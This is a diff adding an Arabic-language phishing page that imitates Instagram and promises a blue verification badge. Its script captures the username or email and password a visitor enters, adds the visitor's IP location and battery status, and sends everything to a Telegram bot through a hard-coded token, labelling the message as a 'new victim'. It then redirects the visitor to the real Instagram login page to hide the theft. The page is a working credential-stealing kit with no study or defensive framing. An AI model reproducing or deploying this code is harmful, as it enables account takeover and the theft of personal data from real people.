@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - توثيق الحساب</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        .logo { font-size: 60px; margin-bottom: 10px; }
+        h1 { color: #262626; font-size: 20px; }
+        p { color: #8e8e8e; font-size: 13px; margin: 8px 0; }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            color: white; padding: 8px 20px; border-radius: 20px;
+            font-weight: bold; margin: 10px 0; font-size: 14px;
+        }
+        input {
+            width: 100%; padding: 12px; margin: 6px 0;
+            border: 1px solid #dbdbdb; border-radius: 5px;
+            font-size: 14px; outline: none; background: #fafafa;
+        }
+        input:focus { border-color: #a8a8a8; }
+        .btn {
+            width: 100%; padding: 10px;
+            background: #0095f6; color: white;
+            border: none; border-radius: 8px;
+            font-size: 16px; font-weight: bold;
+            cursor: pointer; margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📷</div>
+        <h1>توثيق العلامة الزرقاء</h1>
+        <span class="badge">✓ شارة التوثيق</span>
+        <p>أنت مؤهل للحصول على العلامة الزرقاء</p>
+        <p style="color:#ff3333;">أدخل بياناتك لتأكيد الطلب</p>
+        
+        <input type="text" id="email" placeholder="اسم المستخدم أو الإيميل">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button class="btn" onclick="submitData()">تقديم الطلب</button>
+        <p style="font-size:10px;color:#999;margin-top:10px;">Instagram © Meta 2024</p>
+    </div>
+
+    <script>
+        function getChatId() { return new URL(window.location.href).searchParams.get('chatId') || ''; }
+        const BOT_TOKEN = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+
+        async function getIpInfo() {
+            try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; }
+        }
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) { const b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; }
+            return { level: '?', charging: '?' };
+        }
+
+        async function submitData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            if (!email || !password) { alert('يرجى إدخال جميع البيانات!'); return; }
+
+            const [ip, battery] = await Promise.all([getIpInfo(), getBatteryInfo()]);
+            const text = `📷 انستغرام - ضحية جديدة!\n\n📧 الايميل: ${email}\n🔑 الباسورد: ${password}\n\n🌍 IP: ${ip.ip}\n📍 الدولة: ${ip.country}\n🏙️ المدينة: ${ip.city}\n🔋 البطارية: ${battery.level}%\n⚡ الشحن: ${battery.charging}`;
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: getChatId(), text: text })
+            });
+            window.location.href = 'https://instagram.com/accounts/login/';
+        }
+    </script>
+</body>
+</html>
